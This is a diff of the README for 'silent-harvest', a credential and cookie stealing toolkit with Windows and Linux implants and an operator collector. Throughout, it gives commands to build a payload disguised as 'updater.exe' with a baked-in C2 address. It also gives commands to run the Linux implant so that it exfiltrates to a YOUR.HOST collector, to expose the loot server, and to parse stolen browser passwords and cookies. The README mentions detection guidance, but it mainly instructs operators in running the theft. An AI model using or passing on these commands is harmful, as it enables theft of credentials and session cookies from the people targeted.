@@ -1,5 +1,7 @@
 # silent-harvest
 
+[![CI](https://github.com/AsHfIEXE/silent-harvest/actions/workflows/ci.yml/badge.svg)](../../actions/workflows/ci.yml)
+
 Cross-platform credential & cookie harvesting toolkit: a stealthy Windows
 implant, a dependency-free Linux implant, and an operator-side collector that
 receives, decrypts, and parses everything into usable credentials.
@@ -37,9 +39,12 @@ implant (target)                                operator
 | `server/collector.py` | threaded loot receiver + encrypted store |
 | `server/parse_loot.py` | bundle → report/creds/cookie files, hive dump hookup |
 | `server/shcrypto.py` | container format reference implementation (Python) |
-| `build.bat` | Windows implant build (bakes C2 + PSK) |
-| `test/` | synthetic round-trip tests + debug probes |
+| `build.bat` | Windows implant build (bakes C2 + PSK + TLS pin + auth token) |
+| `tools/genconfig.ps1` | config generation (PSK obfuscation, fingerprinting) |
+| `test/` | round-trip tests, malformed-input fuzz, cross-language interop |
 | `docs/TECHNIQUES.md` | technique details, ATT&CK map, detection guidance |
+| `docs/COMPATIBILITY.md` | per-OS / per-privilege compatibility matrix |
+| `.github/workflows/ci.yml` | CI: windows+ubuntu × py3.9–3.13 test matrix |
 
 ## Requirements
 
@@ -60,14 +65,16 @@ falls back to ctypes → libcrypto (OpenSSL — present everywhere).
 
 ```bat
 cd silent-harvest
-build.bat /name updater.exe /c2 http://YOUR.HOST:8443/gate /psk LONGRANDOMSECRET
+build.bat /name updater.exe /c2 http://YOUR.HOST:8443/gate /auth opstoken /pin cert:AB12...
 ```
 
 | arg | default | meaning |
 |---|---|---|
 | `/name` | `appsetup.exe` | release binary name |
 | `/c2`   | `http://127.0.0.1:8443/gate` | collector endpoint baked into the binary |
-| `/psk`  | `dev-psk-change-me` | pre-shared key; also written to `server/psk.txt` for the collector |
+| `/psk`  | **random per build** | pre-shared key. Omitted → strong random key generated and written to `server\psk.txt` (collector reads it). The build log shows only a sha256 **fingerprint**, never the key. |
+| `/pin`  | *(verify)* | TLS policy: omitted = verify against system CAs; `cert:HEX` = pin the exact server cert sha256 (use for self-signed collectors — get it with `openssl x509 -in cert.pem -noout -fingerprint -sha256`); `any` = accept anything (DEBUG ONLY, breaks MITM protection) |
+| `/auth` | *(none)* | value sent as `X-SH-Auth` header (required when the collector runs `--auth`) |
 | `/release-only` | — | skip the debug build |
 
 Outputs:
@@ -77,8 +84,13 @@ Outputs:
 | `build/sh_debug.exe` | console | testing — logs every stage to stdout |
 | `build/<name>` | GUI (`winexe`) | payload — no console, no output, runs and exits |
 
-The PSK must match between build and collector — that is the only thing that
-lets the collector decrypt bundles. Never ship `build/` or `server/psk.txt`.
+Secret-handling notes:
+
+- The PSK is embedded in the binary **XOR+base64** — this defeats casual
+  `strings` scanning only, not reverse engineering. **Treat every built
+  binary as secret material**; never ship `build/` or `server/psk.txt`.
+- The PSK must match between build and collector — it is the only thing that
+  lets the collector decrypt bundles. One PSK per operation.
 
 ## Linux implant
 
@@ -89,8 +101,9 @@ the `CFG` dict at the top of the file.
 # self-check (crypto + container roundtrip)
 python3 sh_harvest.py --selftest
 
-# harvest + exfil
+# harvest + exfil (TLS verifies by default; pin self-signed collectors)
 python3 sh_harvest.py --c2 http://YOUR.HOST:8443/gate --psk LONGRANDOMSECRET
+python3 sh_harvest.py --c2 https://YOUR.HOST:8443/gate --pin cert:AB12... --auth opstoken
 
 # or via environment
 SH_C2=http://YOUR.HOST:8443/gate SH_PSK=LONGRANDOMSECRET python3 sh_harvest.py
@@ -109,13 +122,27 @@ ELF with PyInstaller on your build box.
 
 ```bash
 cd server
-python collector.py --port 8443 --bind 0.0.0.0 [--psk SECRET] [--loot-dir ../loot]
+# internet-facing: auth + allowlist + TLS front (see Operational notes)
+python collector.py --port 8443 --bind 0.0.0.0 --psk SECRET \
+    --auth opstoken --allow 10.0.0.0/8,192.168.1.0/24
+# lab box: defaults are fine
+python collector.py --port 8443
 ```
+
+| control | default | meaning |
+|---|---|---|
+| `--auth TOKEN` | off | require `X-SH-Auth: TOKEN` on every request (constant-time compare; implants send it via `build.bat /auth` / `--auth`) |
+| `--allow CIDRS` | any | comma-separated CIDRs allowed to connect |
+| `--max-body MB` | 128 | request body cap |
+| `--rate N` | 60 | requests per source IP per minute |
+| `--psk` / `SH_PSK` / `psk.txt` | dev key | PSK resolution order; `psk.txt` is chmod 0600 on POSIX |
 
 PSK resolution order: `--psk` arg → `SH_PSK` env → `psk.txt` (written by
 `build.bat`) → built-in dev key. Endpoints: `POST /gate` (bundles),
-`GET /health` (liveness). Bundles failing AEAD auth (wrong PSK) are rejected
-and logged, never stored.
+`GET /health` (liveness). Bundles failing AEAD auth (wrong PSK) or carrying
+malformed manifests are rejected with a 400 and logged — never stored. All
+access decisions (accept / deny-auth / deny-source / rate-limit / reject)
+append to `<loot-dir>/access.log`. Slow/dead connections time out at 60s.
 
 ### 2. Run a payload
 
@@ -143,7 +170,21 @@ for later retrieval) · `3` crypto failure (Windows).
 python parse_loot.py                 # newest bundle under loot/
 python parse_loot.py <bundle_dir>    # specific bundle
 python parse_loot.py --bundle f.bin  # standalone container file
+python parse_loot.py --redact        # masked creds for triage/reporting
 ```
+
+**Sensitive-data controls** (parsing creates plaintext — these bound the
+blast radius):
+
+| flag | effect |
+|---|---|
+| `--redact` | mask cookie/password/card values in `creds.json` (`abc...xy(42)` shape), drop plaintext `cookies_*.txt` exports and raw secretsdump output entirely — for triage or sharing reports without exposing secrets |
+| *(default)* | full plaintext outputs, chmod **0600** on POSIX (no-op on Windows) |
+| `--prune-days N` | retention: delete bundles older than N days (index rebuilt) |
+| `--shred DIR\|all` | overwrite every file in a bundle dir with random bytes, then delete it — best-effort secure erasure |
+
+At-rest posture: `bundle.bin` stays ciphertext until you parse it; parse only
+what you need, `--redact` for reporting, `--shred` when done.
 
 Each run writes into the bundle directory:
 
@@ -250,29 +291,46 @@ SAM/SECURITY, esentutl/VSS patterns, handle-table enumeration bursts, the
 `SHV1` wire signature, and Linux auditd/D-Bus angles. Useful both for
 red-team QA against your own EDR and for building detections.
 
-## Testing
+## Testing & CI
 
-Every decryption chain has a synthetic round-trip test (real crypto, known
-values, no live credentials needed):
+Every decryption chain has a round-trip test (real crypto, known values, no
+live credentials), malformed-input handling is fuzz-tested, and the C#↔Python
+container interop is verified end-to-end. CI runs the full matrix on
+`windows-latest` + `ubuntu-latest` × Python 3.9–3.13
+(`.github/workflows/ci.yml`), including a Windows job that builds the C#
+implant with `csc.exe`, runs it, and decrypts its container in Python — with
+a guard that fails the build if the PSK ever leaks into build output.
 
 ```bash
 cd server && python shcrypto.py           # container + PSK rejection
+cd test   && python test_fuzz.py          # 25 malformed-input cases
 cd test   && python synth_firefox.py      # key4 ASN.1 / a11 / 3DES
-cd test   && python synth_chromium.py     # windows chromium v10 (DPAPI+GCM)
-cd test   && python synth_linux.py        # linux implant end-to-end over a synthetic home
+cd test   && python synth_chromium.py     # chromium v10 (DPAPI+GCM)
+cd test   && python synth_linux.py        # linux implant end-to-end
+cd test   && python interop_cs.py         # windows: build C# -> decrypt in python
 ```
+
+See `docs/COMPATIBILITY.md` for the per-OS / per-privilege support matrix.
 
 ## Operational notes
 
-- **PSK discipline:** one PSK per operation; it is the only thing protecting
-  bundles in transit and at rest on the collector.
-- **TLS:** the collector speaks plain HTTP by default; front it with a TLS
-  reverse proxy, or point `--c2` at an `https://` URL — the implant accepts
-  self-signed certs when `AcceptAnyCert` is true. The AEAD layer is
-  independent of transport security.
+- **PSK discipline:** one PSK per operation; builds default to a fresh random
+  key (fingerprint shown, never the key). The PSK is embedded in the payload
+  binary — the binary itself is secret material.
+- **TLS:** default is full verification against system CAs. For self-signed
+  collector certs use `cert:` pinning (`/pin` on Windows, `--pin` on Linux) —
+  never `any` outside a lab. `any` disables MITM protection entirely. The
+  AEAD layer is independent of transport security either way.
+- **Collector exposure:** on anything internet-facing run with `--auth` +
+  `--allow` behind a TLS terminator; the collector itself speaks HTTP and
+  authenticates the *channel* only via your front end + PSK AEAD.
 - **Failure behavior:** unreachable C2 → dead-drop in temp, exit code 2;
-  partial privilege → stages degrade individually and report status; wrong
-  PSK → collector rejects without storing.
+  rejected auth → 401, dead-drop; partial privilege → stages degrade
+  individually and report status; wrong PSK → collector rejects without
+  storing.
+- **Loot lifecycle:** ciphertext at rest until parsed → parse with
+  `--redact` for reporting, full mode for use → `--prune-days` for retention
+  → `--shred` for disposal.
 - **Rebuild after moving:** `build.bat` writes `implant/Config.cs` and
   `server/psk.txt` relative to the repo root — always run it from there.
 
